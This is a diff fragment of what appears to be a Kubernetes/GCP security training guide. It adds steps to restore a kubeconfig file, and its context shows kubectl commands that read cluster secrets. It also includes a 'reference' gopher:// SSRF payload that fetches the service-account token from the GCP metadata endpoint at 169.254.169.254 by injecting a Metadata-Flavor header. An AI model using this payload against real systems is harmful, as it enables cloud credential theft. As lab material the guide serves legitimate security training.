@@ -135,6 +135,14 @@ kubectl $KUBE_OPT describe pod | grep secret
 kubectl $KUBE_OPT get secret dummy-secret -o yaml
 ```
 
+- Move back kubeconfig file
+```
+mv ~/.kube/config.tmp ~/.kube/config
+```
+```
+kubectl config get-contexts
+```
+
 #### (Reference) Get instance token (doesn't use it in this training)
 ```
 gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
